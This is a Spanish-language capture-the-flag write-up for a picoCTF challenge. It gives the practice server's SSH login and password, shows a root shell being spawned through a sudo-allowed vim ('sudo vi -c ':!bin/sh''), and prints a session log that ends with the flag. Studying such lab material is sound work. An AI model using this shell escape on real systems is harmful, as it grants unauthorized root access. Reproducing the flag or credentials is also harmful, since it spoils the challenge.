## **Descripción**
Can you read files in the root file?
Additional details will be available after launching your challenge instance

Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 60628 picoplayer@saturn.picoctf.net`Password: `NBD+zO8s4y`Can you login and read the root file?
## Hints
What permissions do you have?
## **Solución** 
Para este reto haremos lo siguiente:
Hacemos uso de vim para realizar una escalada de privilegios y convertirnos en sudo
Si se permite que el binario se ejecute como superusuario sudo, no se pierden los privilegios elevados y se puede usar para acceder al sistema de archivos, escalar o 	mantener el acceso privilegiado.	

```
picoplayer@challenge:/$ sudo vi -c  ':!bin/sh' dev/null

# ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
# cd root
# ls
# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Mar 16 02:09 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}
# 

```

## **Notas adicionales**
Tambien podemos ejecutar los comandos ls y cat desde vim para obtener la bandera

## **Referencias**
- https://rm-rf.es/ejecutar-comandos-directamente-desde-vi-vim/